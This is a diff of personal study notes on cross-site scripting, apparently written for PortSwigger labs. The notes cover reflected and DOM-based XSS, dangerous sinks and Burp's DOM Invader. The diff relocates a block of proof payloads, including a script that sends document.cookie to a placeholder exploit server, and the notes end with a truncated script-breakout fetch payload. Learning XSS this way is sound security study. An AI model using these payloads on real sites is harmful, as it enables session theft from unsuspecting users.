@@ -1,11 +1,3 @@
-<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
-
-Proof:
-alert()
-alert(document.domain)
-alert(document.cookie)
-print()
-
 Reflected cross-site scripting:
 Malicious script comes from the current HTTP request
 
@@ -24,6 +16,13 @@ To find DOM-based vulnerabilities in non-URL-based input (such as document.cooki
 eval() or innerHTML --> enables attackers to execute malicious JavaScript
 
 DOM Invader --> Burp's built-in browser
+
+Example:
+alert()
+alert(document.domain)
+alert(document.cookie)
+print()
+<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
 
 "</script><script>
         fetch("https://targetURL.com", {
